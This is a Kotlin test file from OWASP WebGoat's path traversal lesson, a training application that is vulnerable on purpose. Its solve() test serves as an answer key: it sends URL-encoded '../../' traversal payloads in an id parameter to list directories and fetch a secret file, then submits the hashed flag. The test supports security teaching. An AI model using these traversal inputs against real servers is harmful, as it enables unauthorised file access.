/*
 * SPDX-FileCopyrightText: Copyright © 2020 WebGoat authors
 * SPDX-License-Identifier: GPL-2.0-or-later
 */
package org.owasp.webgoat.lessons.pathtraversal

import org.hamcrest.CoreMatchers.equalTo
import org.hamcrest.CoreMatchers.`is`
import org.hamcrest.Matchers.containsString
import org.junit.jupiter.api.BeforeEach
import org.junit.jupiter.api.Test
import org.owasp.webgoat.WithWebGoatUser
import org.owasp.webgoat.container.plugins.LessonTest
import org.springframework.http.MediaType
import org.springframework.security.core.token.Sha512DigestUtils
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post
import org.springframework.test.web.servlet.result.MockMvcResultMatchers.content
import org.springframework.test.web.servlet.result.MockMvcResultMatchers.header
import org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath
import org.springframework.test.web.servlet.result.MockMvcResultMatchers.status
import org.springframework.test.web.servlet.setup.MockMvcBuilders
import java.io.File
import java.net.URI

@WithWebGoatUser
class ProfileUploadRetrievalTest : LessonTest() {
    @BeforeEach
    fun setup() {
        mockMvc = MockMvcBuilders.webAppContextSetup(wac).build()
    }

    @Test
    fun solve() {
        // Look at the response
        mockMvc
            .perform(get("/PathTraversal/random-picture"))
            .andExpect(status().`is`(200))
            .andExpect(header().exists("Location"))
            .andExpect(header().string("Location", containsString("?id=")))
            .andExpect(content().contentTypeCompatibleWith(MediaType.IMAGE_JPEG))

        // Browse the directories
        var uri = URI("/PathTraversal/random-picture?id=%2E%2E%2F%2E%2E%2F")
        mockMvc
            .perform(get(uri))
            .andExpect(status().`is`(404))
            .andExpect(content().string(containsString("path-traversal-secret.jpg")))

        // Retrieve the secret file (note: .jpg is added by the server)
        uri = URI("/PathTraversal/random-picture?id=%2E%2E%2F%2E%2E%2Fpath-traversal-secret")
        mockMvc
            .perform(get(uri))
            .andExpect(status().`is`(200))
            .andExpect(
                content().string("You found it submit the SHA-512 hash of your username as answer"),
            ).andExpect(content().contentTypeCompatibleWith(MediaType.IMAGE_JPEG))

        // Post flag
        mockMvc
            .perform(post("/PathTraversal/random").param("secret", Sha512DigestUtils.shaHex("test")))
            .andExpect(status().`is`(200))
            .andExpect(jsonPath("$.assignment", equalTo("ProfileUploadRetrieval")))
            .andExpect(jsonPath("$.lessonCompleted", `is`(true)))
    }

    @Test
    fun shouldReceiveRandomPicture() {
        mockMvc
            .perform(get("/PathTraversal/random-picture"))
            .andExpect(status().`is`(200))
            .andExpect(header().exists("Location"))
            .andExpect(content().contentTypeCompatibleWith(MediaType.IMAGE_JPEG))
    }

    @Test
    fun unknownFileShouldGiveDirectoryContents() {
        mockMvc
            .perform(get("/PathTraversal/random-picture?id=test"))
            .andExpect(status().`is`(404))
            .andExpect(content().string(containsString("cats${File.separator}8.jpg")))
    }
}
